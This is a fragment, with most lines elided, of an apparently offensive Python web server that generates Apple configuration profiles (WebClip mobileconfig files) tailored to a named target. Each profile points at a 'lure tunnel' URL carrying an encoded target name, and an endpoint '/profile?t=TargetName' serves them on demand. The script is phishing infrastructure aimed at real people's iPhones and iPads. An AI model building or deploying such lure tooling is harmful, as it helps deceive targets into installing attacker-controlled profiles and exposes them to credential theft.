...
# ── UPDATE THIS to point at the lure tunnel ──
...
TEMPLATES = {
  ...
  <array>
    <dict>
      ...
      <integer>1</integer>
      <key>URL</key>
      <string>{lure_url}/?t={target_enc}</string>
    </dict>
  </array>
  <key>PayloadDescription</key>
...
def render_profile(tmpl_name, *, clip_uuid, profile_uuid, target_enc):
    ...
    body = tmpl["payload"].format(
        ...
        lure_url=LURE_URL, target_enc=target_enc,
    )
...
async def profile(req):
    """Generate a per-target mobileconfig on the fly. ?t=Target &tmpl=webclip (default)"""
    target    = req.query.get("t", "").strip()[:64]
...
def main():
    ...
    print("  /profile?t=TargetName  — generates WebClip mobileconfig")
